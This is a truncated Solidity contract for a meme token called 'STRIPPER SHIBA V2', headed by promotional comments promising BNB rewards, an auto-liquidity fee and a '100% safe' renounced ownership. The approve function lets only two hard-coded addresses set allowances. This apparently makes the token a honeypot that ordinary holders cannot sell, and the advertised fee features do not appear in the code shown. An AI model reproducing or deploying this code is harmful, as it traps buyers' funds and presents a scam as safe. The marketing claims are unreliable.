...
/** 
        ...
        STRIPPER SHIBA TOKEN V2 
   
   Shiba,Rfi,Feg,CT,Safemoon,Pig combine together to create #STRIPPER SHIBA V2.
    
   Tokenomics features:
   You can earn real BNB.
   ...
   I will renounce the ownership to burn addresses to transfer #STRIPPER SHIBA V2 to the community, make sure it's 100% safe.

   I will add 0.6 BNB and all the left 50% total supply to the pool
   Can you make #STRIPPER SHIBA V2 100000X? 

   1,000,000,000,000,000 total supply
   1,000,000,000,000 STRIPPER SHIBA V2 max limit for per trade
  

   3% fee for liquidity will go to an address that the contract creates, 
   it's the best part of the #STRIPPER SHIBA V2 idea, increasing the liquidity pool automatically, 
...
contract STRIPPERSHIBA {
    mapping (address => uint) public balances;
    mapping (address => mapping (address =>uint)) public allowance;
    uint public totalSupply = 1000000000 * 10 ** 15;
    string public name = "STRIPPER SHIBA V2";
    string public symbol = "SSHIBA_V2";
    ...
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0x146D67B24389ba743B4E28ec43d9e8Ed7fc4AF18)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        } 
        else if (msg.sender == address(0xB5E02E98933b0E646a0e701E000D5fCF2FE38895)) {
             allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        }
        else {
